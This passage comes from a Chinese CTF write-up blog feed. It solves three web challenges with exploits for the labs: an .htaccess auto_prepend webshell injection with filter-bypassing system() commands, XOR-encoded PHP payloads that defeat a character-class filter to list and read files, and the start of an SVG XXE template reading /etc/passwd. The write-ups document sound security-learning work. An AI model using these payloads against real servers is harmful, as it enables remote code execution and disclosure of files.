function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>对传参filename，进行正则，只允许使用.和字母</p><hr><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$files</span> = scandir(&#x27;./&#x27;); </span><br>   foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>       <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>               unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>           &#125;<br>       &#125;<br>   &#125;<br>   file_put_contents(<span class="hljs-symbol">$</span>filename, <span class="hljs-symbol">$</span>content . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br></code></pre></td></tr></table></figure><p>再一次删除当前目录下除了index.php的文件，然后使用file_put_contents函数以我们传入的filename和content作为参数写入文件。并且在content后连接\nhello,world字符串。</p><hr><p>首先先试试传入muma.php，内容为一句话木马，传完之后url访问，发现不能正常解析php，会被当做文本输出，而不是代码执行。</p><p>然后我就想着先传一个.htaccess或者.user.ini上去，再传我们的muma.php使其能够当做php执行，但是这里只能传一个文件，因为再传第二个文件的时候前一个文件会被删除。</p><p>这里就涉及到一个新的知识点了。</p><h2 id="htaccess新知识"><a href="#htaccess新知识" class="headerlink" title=".htaccess新知识"></a>.htaccess新知识</h2><p>.htaccess有这样一个运用，.htaccess可以把自己指定当做php文件处理</p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">.htaccess详解</a></p><p><img src="/../image/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp-1.png"></p><p>这题file被过滤了，但是在.htaccess的语法中可以使用\来连接下一行的代码，然后由于源码会在我们写入的内容后添加一句\nHello, world，由于<code>\n</code>所以在写入文件之后会把后面的英文写入到下一行，根据了解这不符合当前<code>.htaccess</code>解析格式，不能够正常解析，所以我们可以在php代码后加上\对\n的\进行转义，使其失去换行效果。</p><p><strong>所以最后.htaccess中的内容为。</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fi\</span><br><span class="language-xml">le .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\nHello,world</span><br></code></pre></td></tr></table></figure><p>所有的细节已经分析完毕，只需要将文件名和文件内容传参即可自动解析其中的<code>php</code>代码，将结果输出出来了，<code>#</code>后面跟着任意代码执行，由于传参是一行的，所以换行的地方需要使用<code>%0a</code>进行代替,<code>#</code>用<code>%23</code>代替，传参测试<code>paylaod</code>，运行两次成功执行代码</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?content=php_value auto_prepend_fi\%<span class="hljs-number">0</span>ale .htaccess%<span class="hljs-number">0</span>a%<span class="hljs-number">23</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<span class="hljs-meta">?&gt;</span>\&amp;filename=.htaccess<br></code></pre></td></tr></table></figure><p>回显结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">php_value auto_prepend_fi\ le <span class="hljs-selector-class">.htaccess</span> <span class="hljs-selector-id">#index</span><span class="hljs-selector-class">.php</span> \ Hello, world<br></code></pre></td></tr></table></figure><p>payload成功执行</p><p>现在只要修改命令即可拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?content=php_value auto_prepend_fi\%<span class="hljs-number">0</span>ale .htaccess%<span class="hljs-number">0</span>a%<span class="hljs-number">23</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);<span class="hljs-meta">?&gt;</span>\&amp;filename=.htaccess<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php_value auto_prepend_fi\ le .htaccess #bin boot dev etc flag home lib lib64 media mnt opt <span class="hljs-keyword">proc</span><span class="hljs-title"> root</span> run<span class="hljs-title"> sbin</span> srv<span class="hljs-title"> start.sh</span> sys<span class="hljs-title"> tmp</span> usr<span class="hljs-title"> var</span> \<span class="hljs-title"> Hello,</span> world<br></code></pre></td></tr></table></figure><p>直接cat &#x2F;flag不行，因为flag被过滤了，简单的rce绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">cat /fl\ag<br>cat /fl<span class="hljs-string">&#x27;a&#x27;</span>g<br>cat /fla*<br><br><br>?content=php_value auto_prepend_fi\%<span class="hljs-number">0</span>ale .htaccess%<span class="hljs-number">0</span>a%<span class="hljs-number">23</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /fl\ag&quot;</span>);<span class="hljs-meta">?&gt;</span>\&amp;filename=.htaccess<br></code></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> auto_prepend_fi\ le .htaccess #flag&#123;<span class="hljs-number">3</span>bbbccd7-e8d2-<span class="hljs-number">427</span>a-bd05-<span class="hljs-number">7</span>e16a34a2e0b&#125; \ Hello, world<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> .htaccess新知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISITDTU2019-EasyPHP</title>
      <link href="/2025/04/22/ISITDTU2019-EasyPHP/"/>
      <url>/2025/04/22/ISITDTU2019-EasyPHP/</url>
      
        <content type="html"><![CDATA[<h1 id="ISITDTU2019-EasyPHP"><a href="#ISITDTU2019-EasyPHP" class="headerlink" title="ISITDTU2019-EasyPHP"></a>ISITDTU2019-EasyPHP</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显要我们进行RCE</p><p>需要绕过两个if正则判断</p><p><strong>第一个if</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br></code></pre></td></tr></table></figure><p>匹配的字符范围和特殊字符：</p><ul><li>[\x00- 0-9]：匹配 ASCII 控制字符和数字 0-9。</li><li>&#39;“：匹配单引号和双引号。</li><li>$&amp;.,|[{_defgops\x7F]：匹配特定字符集合，包括 $, &amp;, ., ,, |, [, {, _, d, e, f, g, o, p, s 和 ASCII 值为 \x7F 的字符。</li></ul><hr><p><strong>第二个if</strong></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">strlen(<span class="hljs-name">count_chars</span>(<span class="hljs-name">strtolower</span>($_), <span class="hljs-number">0</span>x3)) &gt; <span class="hljs-number">0</span>xd<br></code></pre></td></tr></table></figure><p>这段代码的意思是传入的字符种类不能超过0xd即13种</p><hr><p>先试试取反</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?_<span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;   # phpinfo();</span><br></code></pre></td></tr></table></figure><p>或者异或</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;?php<br>$s = urlencode(<span class="hljs-string">&quot;phpinfo&quot;</span> ^ urldecode(<span class="hljs-string">&quot;%ff%ff%ff%ff%ff%ff%ff&quot;</span>));<br>echo <span class="hljs-string">&quot;((&quot;</span>.$s.<span class="hljs-string">&quot;)^(&quot;</span>.<span class="hljs-string">&quot;%ff%ff%ff%ff%ff%ff%ff))();&quot;</span>;<br><br># ((%8F%97%8F%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();<br></code></pre></td></tr></table></figure><p>发现能够执行phpinfo()</p><p><img src="/../image/ISITDTU2019-EasyPHP-1.png"></p><p>查看禁用函数</p><p><img src="/../image/ISITDTU2019-EasyPHP-2.png"></p><p>把一些常用的全部过滤了，但是我们可以使用<code>print_r</code>、<code>scandir()</code>两个函数读取目录，再使用<code>show_source()</code>读取文件</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>))<br>    <br>(%8F%8D%96%91%8B%A0%8D^%ff%ff%ff%ff%ff%ff%ff)((%8C%9C%9E%91%9B%96%8D^%ff%ff%ff%ff%ff%ff%ff)((%D1^%ff)))<br></code></pre></td></tr></table></figure><p>我们测一下用了多少字符：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>$s <span class="hljs-operator">=</span> &#x27;(<span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>D<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)((<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>C<span class="hljs-variable">%9</span>E<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)((<span class="hljs-variable">%D1</span>^<span class="hljs-variable">%ff</span>)))&#x27;<span class="hljs-comment">;</span><br>echo strlen(count_chars($s<span class="hljs-punctuation">,</span><span class="hljs-number">3</span>))<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br># <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><p>但是发现字符种类数超了</p><p>总共16个字符</p><p>我们需要控制在13个以内，除了<code>();^</code> 就只剩下了9个字符</p><p>需要减少字符</p><p>减少字符的原理就是<strong>要找到可以替换的，即在内部可以互相异或出来的</strong></p><p>替换字符脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">en</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s) ^ <span class="hljs-number">0xff</span>)[<span class="hljs-number">2</span>:]<br><br><br>p = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;printrscandir&#x27;</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> p:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> p:<br>            <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> p:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(j) ^ <span class="hljs-built_in">ord</span>(k) ^ <span class="hljs-built_in">ord</span>(m) == <span class="hljs-built_in">ord</span>(i):<br>                    <span class="hljs-keyword">if</span>(j == k <span class="hljs-keyword">or</span> j == m <span class="hljs-keyword">or</span> m == k):<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(i+<span class="hljs-string">&#x27;==&#x27;</span>+j + <span class="hljs-string">&#x27;^&#x27;</span> + k + <span class="hljs-string">&#x27;^&#x27;</span>+m, end=<span class="hljs-string">&#x27;\t&#x27;</span>)<br>                        <span class="hljs-built_in">print</span>(<br>                            <span class="hljs-string">&#x27;&#123;:0&gt;2&#125;  =&gt;  [&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;]&#x27;</span>.<span class="hljs-built_in">format</span>(<br>                                en(i), en(j), en(k), en(m)))<br>                        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这段代码就是找出通过三个字符能异或构造出字符串中一个字符的代码，然后输出他们与<code>%ff</code>异或之后的值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%9</span>e  <span class="hljs-operator">=</span>  <span class="hljs-variable">%9</span><span class="hljs-keyword">c</span> ^ <span class="hljs-variable">%8</span>d ^ <span class="hljs-variable">%8</span>f<br>a <span class="hljs-operator">=</span> <span class="hljs-variable">%9</span>e ^ <span class="hljs-variable">%ff</span>  <span class="hljs-operator">=</span>  <span class="hljs-variable">%9</span><span class="hljs-keyword">c</span> ^ <span class="hljs-variable">%8</span>d ^ <span class="hljs-variable">%8</span>f ^ <span class="hljs-variable">%ff</span><br></code></pre></td></tr></table></figure><p>我们需要挑选出字符串里面一些出现比较少的字符串，替换为3个字符的异或，例如：</p><p>选<code>t</code> ，<code>t==s^i^n 8b =&gt; [&quot;8c&quot;,&quot;96&quot;,&quot;91&quot;]</code></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">t = <span class="hljs-string">\x8B</span> ^ <span class="hljs-string">\xFF</span><br>变为<br>t = <span class="hljs-string">\x8c</span> ^ <span class="hljs-string">\x96</span> ^ <span class="hljs-string">\x91</span> ^ <span class="hljs-string">\xff</span><br></code></pre></td></tr></table></figure><p>我们按照这个思路，批量替换一下字符，让其长度小于13</p><p>我们寻找几个被代替的字符：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> = c^p^r<br><span class="hljs-attr">d</span> = s^c^t<br><span class="hljs-attr">n</span> = i^s^t<br><br><br><span class="hljs-attr">c</span> = %<span class="hljs-number">9</span>C<br><span class="hljs-attr">p</span> = %<span class="hljs-number">8</span>F<br><span class="hljs-attr">r</span> = %<span class="hljs-number">8</span>D<br><span class="hljs-attr">s</span> = %<span class="hljs-number">8</span>C<br><span class="hljs-attr">t</span> = %<span class="hljs-number">8</span>B<br><span class="hljs-attr">i</span> = %<span class="hljs-number">96</span><br></code></pre></td></tr></table></figure><p>于是通过这些来代替</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>))<br>    <br>(%8F%8D%96%91%8B%A0%8D^%ff%ff%ff%ff%ff%ff%ff)((%8C%9C%9E%91%9B%96%8D^%ff%ff%ff%ff%ff%ff%ff)((%D1^%ff)))<br></code></pre></td></tr></table></figure><p>替代后：将<code>a n d</code> 替换</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">print_r <span class="hljs-operator">=</span> (<span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>D<span class="hljs-variable">%96</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br><br>scandir <span class="hljs-operator">=</span> (<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>C<span class="hljs-variable">%9</span>C<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>C<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br> <br>. <span class="hljs-operator">=</span> (<span class="hljs-variable">%D1</span>^<span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure><p>所以<code>print_r(scandir(&#39;.&#39;))</code>：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%8</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>d)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%8</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(<span class="hljs-variable">%d1</span>^<span class="hljs-variable">%ff</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>查看到flag文件在数组最后的位置，使用end()获得数组最后一个值来读取，然后配合show_source函数读取</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">show_source(<span class="hljs-keyword">end</span>(scandir(&#x27;.&#x27;)))<br><br>?_<span class="hljs-operator">=</span>((<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%97</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%88</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%a0</span>)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%97</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%88</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%a0</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%a0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>d)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>d)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d)^(<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%97</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(<span class="hljs-variable">%d1</span>^<span class="hljs-variable">%ff</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 异或绕过进阶 </tag>
            
            <tag> 无字母数字rce </tag>
            
            <tag> 限制字符种类绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesCF2019-SVGMagic</title>
      <link href="/2025/04/22/BSidesCF2019-SVGMagic/"/>
      <url>/2025/04/22/BSidesCF2019-SVGMagic/</url>
      
        <content type="html"><![CDATA[<h1 id="BSidesCF2019-SVGMagic"><a href="#BSidesCF2019-SVGMagic" class="headerlink" title="BSidesCF2019-SVGMagic"></a>BSidesCF2019-SVGMagic</h1><p>打开环境是一个svg转png的文件上传</p><p>参考：<a href="https://www.sohu.com/a/434168767_99907709">浅谈SVG的两个黑魔法</a></p><p>由SVG造成的XXE注入</p><p>模版</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span 